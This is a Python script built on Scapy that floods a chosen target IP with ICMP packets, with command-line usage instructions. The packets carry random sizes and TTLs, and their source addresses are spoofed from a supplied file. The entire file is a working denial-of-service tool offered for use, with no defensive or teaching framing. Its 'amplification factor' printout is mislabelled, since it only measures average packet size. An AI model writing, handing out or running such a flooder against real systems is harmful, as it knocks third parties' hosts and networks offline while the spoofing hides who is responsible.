from scapy.all import IP, ICMP, send
import random
import time
import sys

def icmp_flood(target_ip, ip_pool, min_packet_size=64, max_packet_size=1024, burst_size=10):
    print(f"Starting ICMP flood attack on {target_ip}...")
    total_packets_sent = 0
    total_data_sent = 0
   
    try:
        while True:
            for _ in range(burst_size):
                packet_size = random.randint(min_packet_size, max_packet_size)
                ttl_value = random.randint(1, 255)
                spoofed_ip = random.choice(ip_pool)
                packet = IP(dst=target_ip, src=spoofed_ip, ttl=ttl_value)/ICMP()/("X" * packet_size)
                send(packet, verbose=False)
                total_packets_sent += 1
                total_data_sent += packet_size
            interval = random.uniform(0.1, 1.0)
            time.sleep(interval)
            print(f"Sent {total_packets_sent} packets so far...")
   
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
        print(f"Total packets sent: {total_packets_sent}")
        print(f"Total data sent: {total_data_sent} bytes")
        amplification_factor = total_data_sent / (total_packets_sent * min_packet_size)
        print(f"Amplification factor: {amplification_factor:.2f}")
   
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 icmp_flood.py <target_ip> <spoofed_ip_pool_file>")
        sys.exit(1)
   
    target = sys.argv[1]
   
    try:
        with open(sys.argv[2], "r") as f:
            ip_pool = [line.strip() for line in f.readlines()]
        if not ip_pool:
            raise ValueError("IP pool is empty!")
        print(f"Loaded {len(ip_pool)} spoofed IPs.")
    except Exception as e:
        print(f"Error loading IP pool file: {e}")
        sys.exit(1)
   
    icmp_flood(target, ip_pool)
